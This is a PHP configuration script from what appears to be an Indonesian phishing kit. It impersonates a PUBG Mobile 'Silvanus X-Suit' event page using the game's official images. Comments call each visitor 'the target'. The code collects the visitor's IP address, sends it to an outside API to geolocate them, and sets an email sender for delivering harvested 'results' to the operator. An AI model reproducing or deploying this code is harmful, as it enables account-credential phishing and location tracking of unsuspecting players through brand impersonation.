<?php
// SCRIPT BY ARPANTEK
// COPYRIGHT © ITS ME ARPANTEK
// HARGAI W OK, JANGAN LO UBAH COPYRIGHT NYA

// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK MENDAPATKAN INFORMASI TAHUN SAAT INI (UNTUK DITAMPILKAN DIBAGIAN FOOTER HALAMAN)
$yearNow = date('Y');

// KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'Silvanus X-Suit is here!';
$description = 'Natures Guardian Wild Arrival';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/images/event/silvanusx_suit/share/en.png';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'ITS ME ARPANTEK';
$sender = 'From: ARPANTEK <sendgrid.me@gmail.com>';

// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "https://api-xyz.com/system/flag/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
		curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$arpantek_continent = $data['continent'];
$arpantek_country = $data['country'];
$arpantek_city = $data['city'];
$arpantek_region = $data['region'];
$arpantek_callingcode = $data['code'];
$arpantek_latitude = $data['latitude'];
$arpantek_longitude = $data['longitude'];
$arpantek_ip_address = $data['ip_address'];
$arpantek_flag = $data['flag'];
?>
